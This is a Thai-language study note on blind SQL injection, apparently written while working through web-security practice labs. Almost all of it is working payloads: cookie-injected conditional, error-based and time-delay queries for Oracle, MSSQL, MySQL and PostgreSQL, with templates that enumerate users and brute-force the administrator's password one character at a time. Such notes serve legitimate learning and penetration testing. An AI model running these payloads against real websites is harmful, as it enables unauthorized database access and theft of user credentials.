# 🕶️ 2. Blind SQL Injection

> **Blind SQLi** = ไม่เห็น output ตรงๆ → ต้องสังเกตจากเงื่อนไขและความเปลี่ยนแปลงของหน้าเว็บ

การดึงข้อมูลอาจมาจาก: URL, Form, หรือ Cookie

---

## 1️⃣ Conditional Responses

### หลักการ
ถ้าเงื่อนไขเป็นจริง → source code จะเห็น **"Welcome back!"**
(ในการ hack จริง สังเกตจากการเปลี่ยนแปลงของหน้าเว็บ)

### ทดสอบช่องโหว่ผ่าน Cookie
```sql
' AND '1'='1--   -- ✅ เงื่อนไขเป็นจริง → เห็น Welcome back
' AND '1'='2--   -- ❌ เงื่อนไขเป็นเท็จ → ไม่เห็น Welcome back
```

```http
Cookie: TrackingId=xyz' AND '1'='1--
Cookie: TrackingId=xyz' AND '1'='2--
```

### Check Table ว่ามีอยู่ไหม
```sql
' AND (SELECT 'x' FROM ชื่อTable LIMIT 1)='x'--
```
- Table มีอยู่ → `SELECT 'x'` คืน `'x'` → true → Welcome back ✅
- Table ไม่มี → error → ไม่มี Welcome back ❌

### นับ user ใน table
```sql
' AND (SELECT COUNT(*) FROM ชื่อTable)=1'--
```

### Check ว่า user มีอยู่
```sql
' AND (SELECT username FROM users WHERE username='ชื่อที่จะCheck')='ชื่อที่จะCheck'--
```

> 💡 **Tip:** ลอง check `administrator` ก่อน เพราะมีสิทธิ์สูง

### Check Length ของ password
```sql
' AND (SELECT LENGTH(password) FROM users WHERE username='ชื่อuser')>1--
```
→ เมื่อรู้ length แล้ว → **Brute force** ทีละตัวอักษร

### Brute Force ด้วย Cluster Bomb (Intruder)
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='ชื่อuser'),§1§,1)='§a§'--
```

**อธิบาย `SUBSTRING(string, start, length)`:**
- `string` = ข้อความ
- `start` = เริ่มที่ตัวที่เท่าไร (ใส่ wordlist 1-20 ถ้า password 20 ตัว)
- `length = 1` = ตัดมาแค่ 1 ตัว
- `='a'` = เช็คว่าตัวนั้นคือ `a` ไหม (wordlist a-z)

---

## 2️⃣ Conditional Error

### ตรวจสอบว่ามีช่องโหว่ไหม
| Input | Status | ความหมาย |
|-------|--------|---------|
| `'` | 500 error | ✅ มีช่องโหว่ |
| `''` | 200 OK | ❌ ไม่มีช่องโหว่ |

### Detect DB Type (ใส่ใน Cookie)

```sql
-- Oracle (เท่านั้นที่รู้จัก dual)
'||(SELECT '' FROM dual)||'
-- Oracle → 200 OK | อื่นๆ → 500 Error

-- MSSQL
'+(SELECT TOP 1 @@version)+'
-- MSSQL → 200 OK

-- MySQL (เท่านั้นที่รู้จัก extractvalue())
' AND extractvalue(1,1)-- -

-- PostgreSQL
'||(1::text)||'
-- PostgreSQL → 200 OK | อื่นๆ → 500
```

### 🔷 Oracle Payloads

```sql
-- Test DB เป็น Oracle
'||(SELECT '' FROM dual)||'

-- Conditional error
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
-- ถ้า true → 1/0 → 500 Error

-- Verify table
'||(SELECT '' FROM users WHERE ROWNUM=1)||'

-- ดึง username ตัวแรก
'||(SELECT CASE WHEN (SUBSTR(username,1,1)='a') 
     THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1)||'
```

### 🔶 MSSQL Payloads

```sql
-- Conditional error (CONVERT trick)
'; IF (1=1) SELECT CONVERT(INT,'a')--

-- Inline
'+(SELECT CASE WHEN (1=1) THEN CONVERT(INT,'a') ELSE '' END)+'

-- Verify table
'+(SELECT TOP 1 '' FROM users)+'

-- ดึง username
'+(SELECT CASE WHEN (SUBSTRING(username,1,1)='a') 
     THEN CONVERT(INT,'a') ELSE '' END FROM users WHERE id=1)+'
```

### 🟠 MySQL Payloads

```sql
-- วิธี 1: extractvalue (XML error)
'+(SELECT extractvalue(1, CONCAT(0x7e, IF(1=1,'a','b'))))+'

-- วิธี 2: IF + error
AND (SELECT IF(1=1, CONVERT('a',SIGNED INTEGER), 'b'))

-- Verify table
AND (SELECT 1 FROM users LIMIT 1)=1

-- ดึงข้อมูล
AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', 1/0, 1)
```

### 🔵 PostgreSQL Payloads

```sql
-- Conditional error
'||(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS TEXT) ELSE '' END)||'

-- Verify table
'||(SELECT '' FROM users LIMIT 1)||'

-- ดึงข้อมูล
'||(SELECT CASE WHEN (SUBSTRING(username,1,1)='a') 
     THEN CAST(1/0 AS TEXT) ELSE '' END FROM users LIMIT 1)||'
```

---

## 3️⃣ Visible Error-based SQL Injection

### ขั้นตอน

**1) ทดสอบช่องโหว่**
```sql
'
-- ถ้า error → ช่องโหว่มีจริง!
```

**2) ทดสอบ CAST**
```sql
' AND 1=CAST((SELECT 1) AS int)--
```
- `CAST` = แปลงประเภทข้อมูล
- `(SELECT 1)` = ดึงเลข 1
- `CAST(... AS int)` = ให้มองเป็น int
- `1=...` = เช็คว่า 1=1 (true)

**3) ดึง username**
```http
Cookie: TrackingId='AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

> 💡 **ทำไมถึงดึง username ออกมาได้?**
> เพราะ `int` ต้องเป็นจำนวนเต็มเท่านั้น → เวลาเราเอา string มา CAST เป็น int → error → ข้อความโผล่ใน error message

---

## 4️⃣ Time Delays

ใช้เวลาตอบสนองเป็นตัวชี้ว่าเงื่อนไขเป็นจริง/เท็จ

### Syntax ของแต่ละ DB

```sql
-- PostgreSQL
SELECT pg_sleep(10)
' AND (SELECT 1 FROM pg_sleep(10))::text'1
+||+pg_sleep(10)--

-- MySQL
SELECT SLEEP(10)

-- MSSQL
WAITFOR DELAY '0:0:10'

-- Oracle
dbms_pipe.receive_message(('a'),10)
```

### PostgreSQL — Pattern ที่ใช้บ่อย

```sql
-- เทสว่า delay ทำงานไหม
+||+(SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(1)+END)--

-- Check username
'+||+(SELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(1)+END+FROM+users)--

-- Check password length
'+||+(SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=20)+THEN+pg_sleep(10)+ELSE+pg_sleep(1)+END+FROM+users)--

-- Brute force password ทีละตัว
'+||+(SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,1,1)='a')+THEN+pg_sleep(4)+ELSE+pg_sleep(1)+END+FROM+users)--
```

## 🔗 ดูเพิ่ม
- [[01-SQL-Basic|SQL พื้นฐาน + UNION]]
- [[03-Oracle|Oracle Payloads]]
- [[04-WAF-Bypass|WAF Bypass]]

#sql-injection #blind-sqli #time-based #error-based
